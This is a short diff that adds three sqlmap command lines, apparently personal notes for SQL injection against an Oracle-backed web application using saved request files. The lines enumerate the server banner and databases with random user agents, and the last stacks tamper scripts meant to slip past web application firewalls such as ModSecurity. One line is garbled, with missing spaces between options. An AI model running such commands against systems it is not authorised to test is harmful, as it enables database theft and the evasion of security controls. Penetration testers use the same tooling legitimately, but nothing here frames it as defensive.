@@ -1,0 +1,3 @@
+sqlmap -r kkasld --banner --threads=10 --batch--random-agent--no-cast ,
+sqlmap -r kkasld --dbs --threads=10 --batch --dbms=Oracle --random-agent --level=2 --no-cast ,
+sqlmap -r burp_req --dbs --threads=10 --batch --dbms=Oracle --random-agent --level=5 --tamper=charencode.py,modsecurityversioned.py,randomcase.py,space2morehash.py,varnish.py --no-cast ,
